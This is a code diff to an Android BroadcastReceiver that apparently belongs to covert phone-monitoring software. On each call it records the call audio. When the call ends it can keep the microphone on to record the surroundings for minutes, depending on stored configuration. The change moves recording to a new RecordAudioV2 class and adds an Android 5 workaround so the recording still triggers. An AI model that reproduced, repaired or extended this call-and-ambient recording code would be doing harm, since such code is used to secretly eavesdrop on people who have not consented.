@@ -13,8 +13,10 @@ import android.media.MediaRecorder;
 import android.os.Bundle;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 
 import com.inet.android.audio.RecordAudio;
+import com.inet.android.audio.RecordAudioV2;
 import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
@@ -32,6 +34,7 @@ public class CallReceiver extends BroadcastReceiver {
 	private static String LOG_TAG = CallReceiver.class.getSimpleName()
 			.toString();
 	private final static int SOURCE_RECORD = MediaRecorder.AudioSource.VOICE_CALL;
+	private static int osCheck = 0;
 
 	@Override
 	public void onReceive(Context context, Intent intent) {
@@ -74,14 +77,42 @@ public class CallReceiver extends BroadcastReceiver {
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
 				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ",
 						"TelephonyManager.EXTRA_STATE_OFFHOOK");
-
-				setRecord();
+				
+				String osVersion = android.os.Build.VERSION.RELEASE;
+				Log.d(LOG_TAG, "android version: " + osVersion);
+				if (osVersion.startsWith("5")) {
+					Log.d(LOG_TAG, "osCheck = " + osCheck);
+					if (osCheck == 1) {
+						setRecord();
+						osCheck = 0;
+					} else {
+						osCheck++;
+					}
+				} else {
+					setRecord();
+				}
+				
 				// телефон находится в режиме звонка (набор номера / разговор)
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
 				// телефон находится в ждущем режиме (событие наступает по
 				// окончании разговора,
 				// когда уже знаем номер и факт звонка
 				Logging.doLog(LOG_TAG, "EXTRA_STATE_IDLE ", "EXTRA_STATE_IDLE ");
+				
+				String osVersion = android.os.Build.VERSION.RELEASE;
+				Log.d(LOG_TAG, "android version: " + osVersion);
+				if (osVersion.startsWith("5")) {
+					Log.d(LOG_TAG, "osCheck = " + osCheck);
+					if (osCheck == 1) {
+						setRecord();
+						osCheck = 0;
+					} else {
+						osCheck++;
+					}
+				} else {
+					setRecord();
+				}
+				
 				stopRecord();
 				try {
 					// TimeUnit.SECONDS.sleep(1);
@@ -95,27 +126,29 @@ public class CallReceiver extends BroadcastReceiver {
 	}
 
 	private void setRecord() {
+		Log.d(LOG_TAG, "1 setRecord");
 		if (ValueWork.getMethod(ConstantValue.RECORD_CALL, mContext) == 0)
 			return;
 //		if (RecordAudio.mRecording.get())
 //			RecordAudio.executeStopRecording(SOURCE_RECORD, mContext);
-		RecordAudio.executeRecording(-1, SOURCE_RECORD, mContext);
+		RecordAudioV2.executeRecording(-1, SOURCE_RECORD, mContext);
 	}
 
 	private void stopRecord() {
-		if (RecordAudio.mRecording.get()) {
-			RecordAudio.executeStopRecording();
+		Log.d(LOG_TAG, "stopRecord");
+		if (RecordAudioV2.mRecording.get()) {
+			RecordAudioV2.executeStopRecording();
 			
 			int minuteAfterCall = ValueWork.getMethod(
 					ConstantValue.RECORD_ENVORIMENT, mContext);
-			Logging.doLog(LOG_TAG, "recordAudio != null " + minuteAfterCall,
+			Logging.doLog(LOG_TAG, "recording is true, minute after: " + minuteAfterCall,
 					"recordAudio != null " + minuteAfterCall);
 			if (minuteAfterCall == 0) {
 				Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
 						"minuteAfterCall == 0");
-				RecordAudio.checkStateRecord(mContext);
+				RecordAudioV2.checkStateRecord(mContext);
 			} else {
-				RecordAudio.executeRecording(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
+				RecordAudioV2.executeRecording(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
 //				Timer myTimer = new Timer(); // Создаем таймер
 //				Logging.doLog(LOG_TAG, "Timer", "Timer");
 //				myTimer.schedule(new TimerTask() { // Определяем задачу
